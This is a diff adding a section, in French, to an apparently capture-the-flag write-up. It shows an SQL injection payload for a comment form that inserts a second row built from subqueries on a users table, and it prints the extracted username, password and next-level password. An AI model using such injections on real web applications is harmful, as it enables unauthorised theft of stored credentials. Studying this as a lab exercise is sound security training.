@@ -229,4 +229,27 @@ On essaye le caractère ' dans chaque champ. Dans le textara, on obtient la sort
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' 
 ```
 
+On va terminer la chaine pour 1er commentaire et on renseigne les champs d'un second commentaire avec le contenu de la table level9_users
+```sql
+text'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'text2
+```
+on obtient la sortie suivante : 
+
+Autor:
+
+Title:
+
+text
+
+
+Autor: TheBlueFlower
+
+Title: all_MY-PASSwords_are_secure12..//fritzkola55!
+
+text2 
+
+==>  Login correct. 
+
+The password for the next level is: dont_throw_bottles 
+
 ##Level 10
